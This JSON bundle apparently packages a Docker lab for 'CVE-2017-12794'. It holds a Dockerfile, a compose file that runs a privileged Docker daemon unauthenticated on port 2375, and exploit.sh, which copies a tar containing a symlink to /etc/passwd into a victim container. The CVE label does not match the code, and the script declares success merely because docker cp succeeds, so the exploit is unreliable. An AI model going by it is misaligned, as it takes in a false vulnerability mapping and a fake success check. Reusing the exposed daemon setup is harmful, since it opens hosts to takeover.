{
    "files": [
        {
            "location": "./../../dockers/CVE-2017-12794/custom_no_tool/Dockerfile",
            "content": "FROM alpine:3.14\nRUN apk update && apk add --no-cache docker curl tar\nCOPY exploit.sh /exploit.sh\nRUN chmod +x /exploit.sh\nENTRYPOINT [\"sh\",\"/exploit.sh\"]"
        },
        {
            "location": "./../../dockers/CVE-2017-12794/custom_no_tool/docker-compose.yml",
            "content": "version: \"3.8\"\nservices:\n  dind:\n    image: docker:17.09-dind\n    privileged: true\n    command: [\"--host=tcp://0.0.0.0:2375\",\"--tls=false\"]\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    ports:\n      - \"2375:2375\"\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:2375/_ping\"]\n      interval: 2s\n      timeout: 2s\n      retries: 10\n  exploit:\n    build: .\n    depends_on:\n      dind:\n        condition: service_healthy\n    environment:\n      - DOCKER_HOST=tcp://dind:2375"
        },
        {
            "location": "./../../dockers/CVE-2017-12794/custom_no_tool/exploit.sh",
            "content": "#!/bin/sh\n# Wait for Docker daemon to become reachable via HTTP ping\nwhile ! curl -s http://dind:2375/_ping | grep -q OK; do\n  echo \"Waiting for dind daemon...\"\n  sleep 1\ndone\n\n# Start a victim container\ndocker run -d --name victim alpine sleep 1000\n\n# Create a malicious tar archive with a symlink pointing to a host path\nmkdir -p /tmp/mal\necho \"malicious\" > /tmp/mal/payload.txt\nln -s /etc/passwd /tmp/mal/evil\ntar -C /tmp/mal -cf /tmp/malicious.tar .\n\n# Copy the archive into the victim container using the Docker CLI\ndocker cp /tmp/malicious.tar victim:/tmp/malicious.tar\n\nif [ $? -eq 0 ]; then\n  echo \"Exploit attempt completed successfully\"\nelse\n  echo \"Exploit attempt failed\"\nfi\n\n# Keep the container alive long enough for logs to be inspected, then exit\nsleep 2"
        }
    ],
    "directory_tree": "CVE-2017-12794/\n\u2514\u2500 custom_no_tool/\n   \u251c\u2500 Dockerfile\n   \u251c\u2500 docker-compose.yml\n   \u2514\u2500 exploit.sh"
}